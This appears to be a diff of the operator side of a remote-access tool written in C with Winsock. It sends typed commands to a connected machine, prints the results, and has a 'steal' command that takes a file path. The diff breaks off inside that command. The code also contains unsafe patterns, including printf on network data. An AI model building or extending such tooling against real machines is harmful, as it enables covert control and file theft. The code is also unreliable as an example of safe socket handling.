@@ -145,16 +145,22 @@ int main(){
 
 	int bytesSent;
 	int bytesRecv = SOCKET_ERROR;
-	char sendbuf[16000] = "dir";
-	char recvbuf[16000] = "";
+	char sendbuf[16000] = "";
+	char recvbuf[550] = "";
 
 	while (1) {
-		bytesRecv = recv(m_socket, recvbuf, 16000, 0);
-		if (bytesRecv == SOCKET_ERROR)
-			printf("Server: recv() error %ld.\n", WSAGetLastError());
-		else {
-			printf(recvbuf);
+		while (1) {
+			bytesRecv = recv(m_socket, recvbuf, 512, 0);
+
+			if (bytesRecv == SOCKET_ERROR)
+				printf("Server: recv() error %ld.\n", WSAGetLastError());
+			else {
+				printf(recvbuf);
+			}
+			if (strlen(recvbuf) < 512) break;
+			memset(&recvbuf[0], 0, sizeof(recvbuf));
 		}
+		recvbuf[0] = 0;
 		fgets(sendbuf, 16000, stdin);
 		if (strncmp(recvbuf, "steal", strlen("steal")) == 0) {
 			char path[16000];
